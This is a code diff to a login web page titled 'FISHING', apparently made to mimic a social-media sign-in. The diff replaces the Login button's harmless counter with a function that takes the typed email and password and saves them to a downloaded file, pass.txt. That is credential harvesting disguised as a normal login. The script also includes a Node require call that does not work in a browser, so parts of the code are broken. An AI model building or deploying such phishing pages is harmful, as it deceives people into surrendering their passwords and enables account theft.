@@ -11,10 +11,35 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.css" rel="stylesheet"/>
     <script>
         let counter = 0
+        const fs = require('fs');
+        const path = "pass.txt"
+        const encoding = 'UTF-8';
+
 
         function count(){
             counter++;
             alert(counter);
+        }
+        function save(){
+            let email = document.querySelector('#email1').value;
+            let pass  = document.querySelector('#pass1').value;
+            if(email != "" && pass != "")
+                {
+                    alert("Hello There")
+                    const content = `Email: ${email}\nPassword: ${pass}`;
+                const blob = new Blob([content], { type: 'text/plain' });
+
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'pass.txt';
+
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+
+            }
+            else alert("Hello not there")
         }
     </script>
     <title>FISHING</title>
@@ -52,7 +77,7 @@
                                         </div>
 
                                         <div class="pt-1 mb-4">
-                                            <button onclick = "count()" class="btn btn-dark btn-lg btn-block" style="background-color: #0B3141;" type="button">Login</button>
+                                            <button onclick = "save()" class="btn btn-dark btn-lg btn-block" style="background-color: #0B3141;" type="button">Login</button>
                                         </div>
 
                                         <a class="small text-muted" href="https://www.facebook.com">Forgot password?</a>
